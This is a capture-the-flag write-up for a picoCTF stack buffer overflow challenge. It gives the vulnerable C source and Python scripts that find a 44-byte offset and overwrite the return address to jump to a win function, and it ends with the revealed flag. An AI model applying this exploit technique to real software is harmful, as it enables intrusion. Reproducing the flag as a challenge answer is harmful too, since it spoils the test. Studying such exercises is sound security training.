# Description
Control the return address.
Now we're cooking! You can overflow the buffer and return
to the flag function in the program.
You can view source here. And connect with it
using nc saturn.picoctf.net 64695

# Context
On connecting to the server, we are presented with a prompt to enter a string.
```
❯ nc saturn.picoctf.net 64695
Please enter your string: 
123
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
```
The program then prints the string we entered and then returns to the address `0x804932f`.

### Source code
Clearly we must try to return inside the `win` function.
```c
void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
# Solution
The program is vulnerable to a buffer overflow attack. We can overflow the buffer and overwrite the return address to the address of the `win` function.

### How much to overflow?
This python script will write a string of increasing length to the server and print the return address.
When the return address changes, we know that we have overwritten the return address.
```python
def return_address_lookup():
    ret_addres = b'0x804932f'
    i = 31
    while ret_addres == b'0x804932f':
        io = connect()
        print(io.recv())
        i += 1
        io.sendline('a'*i)
        print(f"i = {i}")
        recvd = io.recv()
        print(recvd)
        recvd = strip_return_address(recvd)
        print(recvd)
        ret_addres = recvd

    print(f"Return address changed with {i} chars")
```

This will stop when the return address changes, so now we know that 44
is the offset to overwrite the return address.

Now we can try to overwrite the return address with some trash.
```python
def send_payload(payload):
    io = connect()
    print(io.recv())
    io.sendline(payload)
    print(io.recvall())
    io.interactive()

send_payload(b'A'*48) # 48 to exceed the offset
```
And we get:
```
❯ py solve.py
[+] Opening connection to saturn.picoctf.net on port 56097: Done
b'Please enter your string: \n'
[+] Receiving all data: Done (65B)
[*] Closed connection to saturn.picoctf.net port 56097
b'Okay, time to return... Fingers Crossed... Jumping to 0x41414141\n
```
We have successfully overwritten the return address.

### Writing something useful
Let's se if we can write a more interesting payload, like a
specific sequence of numbers, we'll try `0x01020304`.

```python
def send_overflow(payload):
    offset = b'A'*44
    send_payload(offset+payload)

send_overflow(b'\x01\x02\x03\x04')
```

```
❯ py solve.py
[+] Opening connection to saturn.picoctf.net on port 56097: Done
b'Please enter your string: \n'
[+] Receiving all data: Done (64B)
[*] Closed connection to saturn.picoctf.net port 56097
b'Okay, time to return... Fingers Crossed... Jumping to 0x4030201\n'
```
Seems like the bytes are reversed, fixinig this will not be a problem. 
Lets try `0x10203040`

```
❯ py solve.py
b'Please enter your string: \n'
[+] Receiving all data: Done (64B)
[*] Closed connection to saturn.picoctf.net port 56097
b'Okay, time to return... Fingers Crossed... Jumping to 0x1020304\n'
```
Nice.


### Getting the address of the `win` function
Challange provided the binary, so we can use a dissasembler to get the address of the `win` function.
I'll be using `radare2` but something more like `gdb`, or even `objdump` should work as well.

```
❯ radare2 vuln
[0x080490e0]> aaa
[0x080490e0]> afl
0x08049040    1      6 sym.imp.printf
...
0x08049350    4    101 sym.__libc_csu_init
0x080491f6    3    139 sym.win # <---------------
...
[0x080490e0]> 

```
Address of the `win` function is `0x080491f6`.

### Winning
```python
def send_overflow(payload):
    offset = b'A'*44
    send_payload(offset+payload)

send_overflow(b'\xf6\x91\x04\x08')
```

```
❯ py solve.py
[+] Opening connection to saturn.picoctf.net on port 61705: Done
b'Please enter your string: \n'
[+] Receiving all data: Done (100B)
[*] Closed connection to saturn.picoctf.net port 61705
b'Okay, time to return... Fingers Crossed... Jumping to 0x80491f6\npicoCTF{addr3ss3s_ar3_3asy_b15b081e}'
```